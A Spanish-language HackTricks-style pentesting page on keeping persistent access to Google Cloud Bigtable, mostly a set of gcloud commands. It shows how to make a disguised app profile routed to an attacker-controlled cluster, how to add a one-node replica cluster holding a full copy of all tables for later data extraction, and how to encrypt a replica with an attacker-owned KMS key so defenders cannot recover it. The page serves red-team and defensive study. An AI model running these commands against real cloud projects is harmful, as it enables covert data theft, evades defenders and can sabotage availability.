# GCP - Bigtable Persistencia

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Para más información sobre Bigtable consulta:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### App Profile dedicado para atacante

**Permisos:** `bigtable.appProfiles.create`, `bigtable.appProfiles.update`.

Crea un App Profile que enrute el tráfico a tu clúster réplica y habilita Data Boost para no depender nunca de nodos aprovisionados que los defensores puedan detectar.
```bash
gcloud bigtable app-profiles create stealth-profile \
--instance=<instance-id> --route-any --restrict-to=<attacker-cluster> \
--row-affinity --description="internal batch"

gcloud bigtable app-profiles update stealth-profile \
--instance=<instance-id> --data-boost \
--data-boost-compute-billing-owner=HOST_PAYS
```
Mientras exista este perfil, puedes reconectarte usando credenciales nuevas que hagan referencia a él.

### Mantén tu propio clúster de réplica

**Permisos:** `bigtable.clusters.create`, `bigtable.instances.update`, `bigtable.clusters.list`.

Provisiona un clúster con el mínimo número de nodos en una región de baja actividad. Incluso si tus identidades de cliente desaparecen, **el clúster mantiene una copia completa de todas las tablas** hasta que los defensores lo eliminen explícitamente.
```bash
gcloud bigtable clusters create dark-clone \
--instance=<instance-id> --zone=us-west4-b --num-nodes=1
```
Monitorea esto con `gcloud bigtable clusters describe dark-clone --instance=<instance-id>` para que puedas escalar al instante cuando necesites extraer datos.

### Bloquea la replicación detrás de tu propio CMEK

**Permisos:** `bigtable.clusters.create`, `cloudkms.cryptoKeyVersions.useToEncrypt` on the attacker-owned key.

Trae tu propia clave KMS al desplegar un clon. Sin esa clave, Google no puede recrear ni hacer fail over del cluster, por lo que blue teams deben coordinarse contigo antes de tocarlo.
```bash
gcloud bigtable clusters create cmek-clone \
--instance=<instance-id> --zone=us-east4-b --num-nodes=1 \
--kms-key=projects/<attacker-proj>/locations/<kms-location>/keyRings/<ring>/cryptoKeys/<key>
```
Rota o desactiva la clave en tu proyecto para inutilizar la réplica al instante (aunque aún puedas volver a activarla más tarde).

{{#include ../../../banners/hacktricks-training.md}}
